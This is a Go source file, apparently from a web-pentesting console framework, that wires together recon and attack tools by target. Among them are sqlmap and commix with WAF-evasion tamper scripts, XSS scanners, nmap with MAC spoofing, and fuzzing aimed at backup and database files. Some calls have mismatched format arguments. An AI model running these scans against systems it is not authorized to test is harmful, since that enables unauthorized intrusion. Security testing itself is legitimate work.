package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "menus"
    "utils"
    "banners"
    "strings"
    "bcolors"
    "scriptures"
    "subprocess"
)

var (
    Input string
    Port  string
    Rhost string
    Xhost string
    Yhost string
    Proxy string
    Function string

    scanner  = bufio.NewScanner(os.Stdin)
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
   "proxies": "",
   "rhost": "",
   "rhosts": "",
   "target": "",
   "function": "",
   "wordlist": WordList,
}

func WebsitesPentest() {
    for {
        fmt.Printf("%s%safr3%s websites(%ssrc/pentest_%s%s%s%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.BrightRed, bcolors.BrightYellow, bcolors.Italic, Function, bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

    "? info":               menus.HelpInfo,
    "h info":               menus.HelpInfo,
    "help info":            menus.HelpInfo,

    "v":                banners.Version,
    "version":          banners.Version,

    "s":                utils.Sleep,
    "sleep":            utils.Sleep,

    "c":                utils.ClearScreen,
    "clear":            utils.ClearScreen,
    "clear screen":      utils.ClearScreen,
    "screen clear":     utils.ClearScreen,

    "o":                utils.ListJunks,
    "junks":            utils.ListJunks,
    "outputs":          utils.ListJunks,
    "clear junks":      utils.ClearJunks,
    "clear outputs":    utils.ClearJunks,

    "logs":             subprocess.LogHistory,
    "history":          subprocess.LogHistory,
    "clear logs":       subprocess.ClearHistory,
    "clear history":    subprocess.ClearHistory,

    "? run":            menus.HelpInfoRun,
    "h run":            menus.HelpInfoRun,
    "info run":         menus.HelpInfoRun,
    "help run":         menus.HelpInfoRun,

    "use":              menus.HelpInfoUse,
    "? use":            menus.HelpInfoUse,
    "h use":            menus.HelpInfoUse,
    "info use":         menus.HelpInfoUse,
    "help use":         menus.HelpInfoUse,

    "? exec":           menus.HelpInfoRun,
    "h exec":           menus.HelpInfoRun,
    "info exec":        menus.HelpInfoRun,
    "help exec":        menus.HelpInfoRun,

    "? start":          menus.HelpInfoStart,
    "h start":          menus.HelpInfoStart,
    "info start":       menus.HelpInfoStart,
    "help start":       menus.HelpInfoStart,

    "? launch":         menus.HelpInfoRun,
    "h launch":         menus.HelpInfoRun,
    "info launch":      menus.HelpInfoRun,
    "help launch":      menus.HelpInfoRun,
    "? exploit":        menus.HelpInfoRun,
    "h exploit":        menus.HelpInfoRun,
    "info exploit":     menus.HelpInfoRun,
    "help exploit":     menus.HelpInfoRun,
    "? execute":        menus.HelpInfoRun,
    "h execute":        menus.HelpInfoRun,
    "info execute":     menus.HelpInfoRun,
    "help execute":     menus.HelpInfoRun,

    "set":              menus.HelpInfoSet,
    "h set":            menus.HelpInfoSet,
    "info set":         menus.HelpInfoSet,
    "help set":         menus.HelpInfoSet,

    "tips":             menus.HelpInfoTips,
    "h tips":           menus.HelpInfoTips,
    "? tips":           menus.HelpInfoTips,
    "info tips":        menus.HelpInfoTips,
    "help tips":        menus.HelpInfoTips,

    "show":             menus.HelpInfoShow,
    "? show":           menus.HelpInfoShow,
    "h show":           menus.HelpInfoShow,
    "info show":        menus.HelpInfoShow,
    "help show":        menus.HelpInfoShow,

    "info list":        menus.HelpInfoList,
    "help list":        menus.HelpInfoList,
    "use list":         menus.HelpInfoList,
    "list":             menus.HelpInfoList,

    "h option":         menus.HelpInfOptions,
    "? option":         menus.HelpInfOptions,
    "h options":        menus.HelpInfOptions,
    "? options":        menus.HelpInfOptions,
    "info option":      menus.HelpInfOptions,
    "help option":      menus.HelpInfOptions,
    "info options":     menus.HelpInfOptions,
    "help options":     menus.HelpInfOptions,

    "banner":           banners.RandomBanners,
    "g":                utils.BrowseTutarilas,
    "t":                utils.BrowseTutarilas,
    "guide":            utils.BrowseTutarilas,
    "tutarial":         utils.BrowseTutarilas,
    "h":                menus.HelpInfoMenuZero,
    "?":                menus.HelpInfoMenuZero,
    "00":               menus.HelpInfoMenuZero,
    "help":             menus.HelpInfoMenuZero,
    "f":                menus.HelpInfoFeatures,
    "use f":            menus.HelpInfoFeatures,
    "features":         menus.HelpInfoFeatures,
    "use features":     menus.HelpInfoFeatures,

    //Chameleons//
    "info":             menus.HelpInfoWebsites,

    "m":                menus.MenuEight,
    "menu":             menus.MenuEight,

    "option":           menus.WebsitesOptions,
    "options":          menus.WebsitesOptions,
    "show option":      menus.WebsitesOptions,
    "show options":     menus.WebsitesOptions,

    "show all":         menus.ListWebsitesFunctions,
    "list all":         menus.ListWebsitesFunctions,

    "func":             menus.ListWebsitesFunctions,
    "funcs":            menus.ListWebsitesFunctions,
    "functions":        menus.ListWebsitesFunctions,
    "show func":        menus.ListWebsitesFunctions,
    "list funcs":       menus.ListWebsitesFunctions,
    "show funcs":       menus.ListWebsitesFunctions,
    "show function":    menus.ListWebsitesFunctions,
    "list function":    menus.ListWebsitesFunctions,
    "list functions":   menus.ListWebsitesFunctions,
    "show functions":   menus.ListWebsitesFunctions,

    "module":           menus.ListWebsitesFunctions,
    "modules":          menus.ListWebsitesFunctions,
    "list module":      menus.ListWebsitesFunctions,
    "show module":      menus.ListWebsitesFunctions,
    "list modules":     menus.ListWebsitesFunctions,
    "show modules":     menus.ListWebsitesFunctions,


    "1":                    func() {PortScan(Rhost)},
    "run 1":                func() {PortScan(Rhost)},
    "use 1":                func() {PortScan(Rhost)},
    "exec 1":               func() {PortScan(Rhost)},
    "start 1":              func() {PortScan(Rhost)},
    "launch 1":             func() {PortScan(Rhost)},
    "exploit 1":            func() {PortScan(Rhost)},
    "execute 1":            func() {PortScan(Rhost)},
    "run netmap":         func() {PortScan(Rhost)},
    "use netmap":         func() {PortScan(Rhost)},
    "exec netmap":        func() {PortScan(Rhost)},
    "start netmap":       func() {PortScan(Rhost)},
    "launch netmap":      func() {PortScan(Rhost)},
    "exploit netmap":     func() {PortScan(Rhost)},
    "execute netmap":     func() {PortScan(Rhost)},

    "? 1":                  menus.HelpInfoPortScan,
    "info 1":               menus.HelpInfoPortScan,
    "help 1":               menus.HelpInfoPortScan,
    "netmap":             menus.HelpInfoPortScan,
    "info netmap":        menus.HelpInfoPortScan,
    "help netmap":        menus.HelpInfoPortScan,

    "2":                    func() {EnumScan(Rhost)},
    "run 2":                func() {EnumScan(Rhost)},
    "use 2":                func() {EnumScan(Rhost)},
    "exec 2":               func() {EnumScan(Rhost)},
    "start 2":              func() {EnumScan(Rhost)},
    "launch 2":             func() {EnumScan(Rhost)},
    "exploit 2":            func() {EnumScan(Rhost)},
    "execute 2":            func() {EnumScan(Rhost)},
    "run enumscan":            func() {EnumScan(Rhost)},
    "use enumscan":            func() {EnumScan(Rhost)},
    "exec enumscan":           func() {EnumScan(Rhost)},
    "start enumscan":          func() {EnumScan(Rhost)},
    "launch enumscan":         func() {EnumScan(Rhost)},
    "exploit enumscan":        func() {EnumScan(Rhost)},
    "execute enumscan":        func() {EnumScan(Rhost)},

    "? 2":                  menus.HelpInfoEnumScan,
    "info 2":               menus.HelpInfoEnumScan,
    "help 2":               menus.HelpInfoEnumScan,
    "enumscan":                menus.HelpInfoEnumScan,
    "info enumscan":           menus.HelpInfoEnumScan,
    "help enumscan":           menus.HelpInfoEnumScan,

    "3":                    func() {DnsRecon(Rhost)},
    "run 3":                func() {DnsRecon(Rhost)},
    "use 3":                func() {DnsRecon(Rhost)},
    "exec 3":               func() {DnsRecon(Rhost)},
    "start 3":              func() {DnsRecon(Rhost)},
    "launch 3":             func() {DnsRecon(Rhost)},
    "exploit 3":            func() {DnsRecon(Rhost)},
    "execute 3":            func() {DnsRecon(Rhost)},
    "run dnsrecon":           func() {DnsRecon(Rhost)},
    "use dnsrecon":           func() {DnsRecon(Rhost)},
    "exec dnsrecon":          func() {DnsRecon(Rhost)},
    "start dnsrecon":         func() {DnsRecon(Rhost)},
    "launch dnsrecon":        func() {DnsRecon(Rhost)},
    "exploit dnsrecon":       func() {DnsRecon(Rhost)},
    "execute dnsrecon":       func() {DnsRecon(Rhost)},

    "? 3":                  menus.HelpInfoDnsRecon,
    "info 3":               menus.HelpInfoDnsRecon,
    "help 3":               menus.HelpInfoDnsRecon,
    "dnsrecon":               menus.HelpInfoDnsRecon,
    "info dnsrecon":          menus.HelpInfoDnsRecon,
    "help dnsrecon":          menus.HelpInfoDnsRecon,


    "4":                    func() {TechScan(Rhost)},
    "run 4":                func() {TechScan(Rhost)},
    "use 4":                func() {TechScan(Rhost)},
    "exec 4":               func() {TechScan(Rhost)},
    "start 4":              func() {TechScan(Rhost)},
    "launch 4":             func() {TechScan(Rhost)},
    "exploit 4":            func() {TechScan(Rhost)},
    "execute 4":            func() {TechScan(Rhost)},
    "run techscan":         func() {TechScan(Rhost)},
    "use techscan":         func() {TechScan(Rhost)},
    "exec techscan":        func() {TechScan(Rhost)},
    "start techscan":       func() {TechScan(Rhost)},
    "launch techscan":      func() {TechScan(Rhost)},
    "exploit techscan":     func() {TechScan(Rhost)},
    "execute techscan":     func() {TechScan(Rhost)},

    "? 4":                  menus.HelpInfoTechScan,
    "info 4":               menus.HelpInfoTechScan,
    "help 4":               menus.HelpInfoTechScan,
    "techscan":             menus.HelpInfoTechScan,
    "info techscan":        menus.HelpInfoTechScan,
    "help techscan":        menus.HelpInfoTechScan,

    "5":                    func() {AssetScan(Rhost)},
    "run 5":                func() {AssetScan(Rhost)},
    "use 5":                func() {AssetScan(Rhost)},
    "exec 5":               func() {AssetScan(Rhost)},
    "start 5":              func() {AssetScan(Rhost)},
    "launch 5":             func() {AssetScan(Rhost)},
    "exploit 5":            func() {AssetScan(Rhost)},
    "execute 5":            func() {AssetScan(Rhost)},
    "run asetscan":       func() {AssetScan(Rhost)},
    "use asetscan":       func() {AssetScan(Rhost)},
    "exec asetscan":      func() {AssetScan(Rhost)},
    "start asetscan":     func() {AssetScan(Rhost)},
    "launch asetscan":    func() {AssetScan(Rhost)},
    "exploit asetscan":   func() {AssetScan(Rhost)},
    "execute asetscan":   func() {AssetScan(Rhost)},

    "? 5":                  menus.HelpInfoAsetScan,
    "info 5":               menus.HelpInfoAsetScan,
    "help 5":               menus.HelpInfoAsetScan,
    "asetscan":           menus.HelpInfoAsetScan,
    "info asetscan":      menus.HelpInfoAsetScan,
    "help asetscan":      menus.HelpInfoAsetScan,


    "6":                    func() {FuzzScan(Rhost)},
    "run 6":                func() {FuzzScan(Rhost)},
    "use 6":                func() {FuzzScan(Rhost)},
    "exec 6":               func() {FuzzScan(Rhost)},
    "start 6":              func() {FuzzScan(Rhost)},
    "launch 6":             func() {FuzzScan(Rhost)},
    "exploit 6":            func() {FuzzScan(Rhost)},
    "execute 6":            func() {FuzzScan(Rhost)},
    "run fuzzscan":        func() {FuzzScan(Rhost)},
    "use fuzzscan":        func() {FuzzScan(Rhost)},
    "exec fuzzscan":       func() {FuzzScan(Rhost)},
    "start fuzzscan":      func() {FuzzScan(Rhost)},
    "launch fuzzscan":     func() {FuzzScan(Rhost)},
    "exploit fuzzscan":    func() {FuzzScan(Rhost)},
    "execute fuzzscan":    func() {FuzzScan(Rhost)},

    "? 6":                  menus.HelpInfoFuzzScan,
    "info 6":               menus.HelpInfoFuzzScan,
    "help 6":               menus.HelpInfoFuzzScan,
    "fuzzscan":            menus.HelpInfoFuzzScan,
    "info fuzzscan":       menus.HelpInfoFuzzScan,
    "help fuzzscan":       menus.HelpInfoFuzzScan,

    "7":                    func() {LeakScan(Rhost)},
    "run 7":                func() {LeakScan(Rhost)},
    "use 7":                func() {LeakScan(Rhost)},
    "exec 7":               func() {LeakScan(Rhost)},
    "start 7":              func() {LeakScan(Rhost)},
    "launch 7":             func() {LeakScan(Rhost)},
    "exploit 7":            func() {LeakScan(Rhost)},
    "execute 7":            func() {LeakScan(Rhost)},
    "run leakscan":        func() {LeakScan(Rhost)},
    "use leakscan":        func() {LeakScan(Rhost)},
    "exec leakscan":       func() {LeakScan(Rhost)},
    "start leakscan":      func() {LeakScan(Rhost)},
    "launch leakscan":     func() {LeakScan(Rhost)},
    "exploit leakscan":    func() {LeakScan(Rhost)},
    "execute leakscan":    func() {LeakScan(Rhost)},

    "? 7":                  menus.HelpInfoLeakScan,
    "info 7":               menus.HelpInfoLeakScan,
    "help 7":               menus.HelpInfoLeakScan,
    "leakscan":            menus.HelpInfoLeakScan,
    "info leakscan":       menus.HelpInfoLeakScan,
    "help leakscan":       menus.HelpInfoLeakScan,

    "8":                    func() {VulnScan(Rhost)},
    "run 8":                func() {VulnScan(Rhost)},
    "use 8":                func() {VulnScan(Rhost)},
    "exec 8":               func() {VulnScan(Rhost)},
    "start 8":              func() {VulnScan(Rhost)},
    "launch 8":             func() {VulnScan(Rhost)},
    "exploit 8":            func() {VulnScan(Rhost)},
    "execute 8":            func() {VulnScan(Rhost)},
    "run vulnscan":        func() {VulnScan(Rhost)},
    "use vulnscan":        func() {VulnScan(Rhost)},
    "exec vulnscan":       func() {VulnScan(Rhost)},
    "start vulnscan":      func() {VulnScan(Rhost)},
    "launch vulnscan":     func() {VulnScan(Rhost)},
    "exploit vulnscan":    func() {VulnScan(Rhost)},
    "execute vulnscan":    func() {VulnScan(Rhost)},

    "? 8":                  menus.HelpInfoVulnScan,
    "info 8":               menus.HelpInfoVulnScan,
    "help 8":               menus.HelpInfoVulnScan,
    "vulnscan":             menus.HelpInfoVulnScan,
    "info vulnscan":        menus.HelpInfoVulnScan,
    "help vulnscan":        menus.HelpInfoVulnScan,


    "9":                    func() {AutoScan(Rhost)},
    "run 9":                func() {AutoScan(Rhost)},
    "use 9":                func() {AutoScan(Rhost)},
    "exec 9":               func() {AutoScan(Rhost)},
    "start 9":              func() {AutoScan(Rhost)},
    "launch 9":             func() {AutoScan(Rhost)},
    "exploit 9":            func() {AutoScan(Rhost)},
    "execute 9":            func() {AutoScan(Rhost)},
    "run bounty":      func() {AutoScan(Rhost)},
    "use bounty":      func() {AutoScan(Rhost)},
    "exec bounty":     func() {AutoScan(Rhost)},
    "start bounty":    func() {AutoScan(Rhost)},
    "launch bounty":   func() {AutoScan(Rhost)},
    "exploit bounty":  func() {AutoScan(Rhost)},
    "execute bounty":  func() {AutoScan(Rhost)},

    "? 9":                  menus.HelpInfoAutoScan,
    "info 9":               menus.HelpInfoAutoScan,
    "help 9":               menus.HelpInfoAutoScan,
    "bounty":              menus.HelpInfoAutoScan,
    "info bounty":         menus.HelpInfoAutoScan,
    "help bounty":         menus.HelpInfoAutoScan,

    "99":                   scriptures.ScriptureNarators,
    "run 99":               scriptures.ScriptureNarators,
    "use 99":               scriptures.ScriptureNarators,
    "exec 99":              scriptures.ScriptureNarators,
    "start 99":             scriptures.ScriptureNarators,
    "launch 99":            scriptures.ScriptureNarators,
    "exploit 99":           scriptures.ScriptureNarators,
    "execute 99":           scriptures.ScriptureNarators,
    "run verses":           scriptures.ScriptureNarators,
    "use verses":           scriptures.ScriptureNarators,
    "exec verses":          scriptures.ScriptureNarators,
    "start verses":         scriptures.ScriptureNarators,
    "launch verses":        scriptures.ScriptureNarators,
    "exploit verses":       scriptures.ScriptureNarators,
    "execute verses":       scriptures.ScriptureNarators,

    "? 99":                 menus.HelpInfoVerses,
    "verses":               menus.HelpInfoVerses,
    "info 99":              menus.HelpInfoVerses,
    "help 99":              menus.HelpInfoVerses,
    "info verses":          menus.HelpInfoVerses,
    "help verses":          menus.HelpInfoVerses,

    }
    if action, exists := commandMap[strings.ToLower(cmd)]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

       "rhost": &Rhost,
       "rhosts": &Rhost,
       "target": &Rhost,
       "proxies": &Proxy,
       "func": &Function,
       "module": &Function,
       "function": &Function,
       "wordlist": &WordList,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

       "rhost": &Rhost,
       "rhosts": &Rhost,
       "target": &Rhost,
       "proxies": &Proxy,
       "func": &Function,
       "module": &Function,
       "function": &Function,
       "wordlist": &WordList,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    WebPenFunctions(Function, Rhost)
}

// Helper functions
func autoExecuteFunc(distro string, function string) {
    //Distro = distro
    //Function = function
    executeFunction()
}

func formatRhost(Rhost string) {
    prefixes := []string{"http://", "https://", "www."}
    Yhost = Rhost
    for _, prefix := range prefixes {
        Yhost = strings.TrimPrefix(Yhost, prefix)
    }
    Yhost = strings.TrimSpace(Yhost)
    if !strings.HasPrefix(Rhost, "http://") && !strings.HasPrefix(Rhost, "https://") {
        Xhost = "http://" + Rhost
    } else {
        Xhost = Rhost
    }
}

func WebPenFunctions(Function string, args ...interface{}) {
    fmt.Printf("\nRHOST => %s\nFunction => %s\n", Rhost, Function)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    commands := map[string]func() {
          "netmap": func() {PortScan(Rhost)},
        "enumscan": func() {EnumScan(Rhost)},
        "dnsrecon": func() {DnsRecon(Rhost)},
        "techscan": func() {TechScan(Rhost)},
        "asetscan": func() {AssetScan(Rhost)},
        "fuzzscan": func() {FuzzScan(Rhost)},
        "leakscan": func() {LeakScan(Rhost)},
        "vulnscan": func() {VulnScan(Rhost)},
          "bounty": func() {AutoScan(Rhost)},
    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.Yellow, bcolors.Endc, Function, bcolors.Green, bcolors.Endc)
    }
}

func EnumScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming enumscan scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("subfinder -all -d %s; amass enum -d %s; findomain -t %s; chaos-client -d %s; shuffledns -d %s; alterx -l %s", Rhost, Rhost, Rhost, Rhost, Rhost, Rhost)
}

func DnsRecon(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming dnsrecon scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("dnsx -l %s; asnmap -d %s; cdncheck -l %s", Rhost, Rhost, Rhost)
}

func PortScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming full port scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("naabu -nmap-cli 'nmap --spoof-mac Cisco -T4 -sV -sC -Pn -v' -host %s", Rhost)
}

func TechScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming tech detection scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`httpx -l %s; aquatone -out %s; httprobe -l %s; gowitness -l %s`, Rhost, Rhost, Rhost, Rhost)
}

func FuzzScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming fuzz scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt")
}

func LeakScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming leak scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("gitleaks detect -v; trufflehog filesystem --no-update --json; semgrep -l")
}

func AssetScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming asset scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("waybackurls %s; gau %s; urlfinder -l %s; gospider -s %s")
}

func VulnScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("nuclei -l %s; jaeles -l %s; ffuf -u %s; uncover -l %s; cvemap -l %s; dalfox -b -u %s; qsreplace -l %s")
}

func AutoScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming auto scan ...\n", bcolors.Green, bcolors.Endc)
}






























func Sublist3r(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/sublist3r/; python3 sublist3r.py -v -d %s`, ToolsDir, Rhost)
}

func Ashock1(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ashok/; python3 ashok.py --headers %s`, ToolsDir, Rhost)
}

func OneForAll(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/oneforall/; python3 oneforall.py --alive True --brute True --port medium --dns True --req True --takeover True --show True run --target %s `, ToolsDir, Rhost)
}

func SeekOlver(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s`, ToolsDir, Rhost)
}

func ParamSpider(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming urls mine ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/paramspider/; python3 paramspider.py -s -d %s`, ToolsDir, Rhost)
}

func SslScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming ssl scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`sslscan --show-certificate --show-sigs --tlsall --verbose %s`, ToolsDir, Rhost)
}

func Gobuster(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dir recon ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`gobuster dir vhost --debug --no-error --random-agent -w %s/WordList/everything.txt -e -u %s`, ToolsDir, Rhost)
}

func Nuclei(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`nuclei -u %s`, ToolsDir, Rhost)
}

func Nikto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`nikto -ask no -Cgidirs all -Display 3 -host %s`, ToolsDir, Rhost)
}

func Bbot(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 3rd vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m gowitness nuclei --allow-deadly -t %s`, ToolsDir, Rhost)
}

func Uniscan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 4th vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`uniscan -qweds -u %s`, ToolsDir, Rhost)
}

func SqlmapAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming sql scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s`, ToolsDir, Rhost)
}

func SqlmapMan() {
    fmt.Printf("\n%s[*] %sPerforming man sql scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard`)
}

func CommixAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming command scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 -u %s`, ToolsDir, Rhost)
}

func CommixMan() {
    fmt.Printf("\n%s[*] %sPerforming man command scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 --wizard`)
}

func KatanaAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`katana -jc -kf all -c 5 -d 3 %s | httpx -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav`, ToolsDir, Rhost)
}

func XsserAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`xsser -c 100 --Cl -u %s`, ToolsDir, Rhost)
}

func XsserMan() {
    fmt.Printf("\n%s[*] %sPerforming man xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`xsser -u --wizard`)
}

func NetTacker1(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s`, ToolsDir, Rhost)
}

func NetTacker2(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming domain scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m subdomain_scan`, ToolsDir, Rhost)
}

func NetTacker3(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming admin finder scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m scan`, ToolsDir, Rhost)
}

func NetTacker4(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming info gathering ...", bcolors.Green, bcolors.Endc)
